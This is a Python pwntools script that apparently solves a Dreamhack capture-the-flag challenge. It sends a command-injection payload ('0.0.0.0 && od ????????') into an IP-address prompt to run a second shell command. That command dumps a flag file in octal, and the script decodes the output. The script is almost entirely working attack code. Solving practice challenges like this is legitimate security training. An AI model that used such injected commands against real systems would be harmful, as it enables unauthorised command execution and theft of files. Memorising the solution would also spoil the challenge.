from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 13115
r = remote(HOST, PORT)

r.sendafter(b': ', b'0.0.0.0 && od ????????')

r.recvuntil(b'0000000 ')
flag = r.recvline().strip().decode().split()
r.recvuntil(b'0000020 ')
flag.extend(r.recvline().strip().decode().split())
r.recvuntil(b'0000040 ')
flag.extend(r.recvline().strip().decode().split())

flag = list(map(lambda x: int(x,8),flag))
flag = [hex(x)[2:] for x in flag]

for i in range(len(flag)):
    if len(flag[i]) % 2 != 0:
        flag[i] = '0'+flag[i]

print(b''.join([bytes.fromhex(x)[::-1] for x in flag]).strip())

r.interactive()